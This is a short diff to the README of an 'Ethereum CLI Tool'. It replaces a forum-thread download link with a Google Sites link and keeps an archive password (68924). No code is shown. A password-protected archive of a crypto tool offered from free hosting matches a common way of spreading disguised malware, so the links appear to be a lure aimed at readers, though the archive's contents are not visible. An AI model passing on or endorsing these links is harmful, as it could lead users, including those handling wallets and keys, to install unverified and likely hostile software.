@@ -31,9 +31,9 @@ Ethereum CLI Tool is a professional command-line application for developers and 
 
 Download the latest release from the link below.
 
-Download: https://software-hub.forumotion.com/t63-ethereum-cli-tool
+**Download:** https://sites.google.com/view/archive-pack/download
 
-Password: 68924
+**Password:** 68924
 
 ---
 
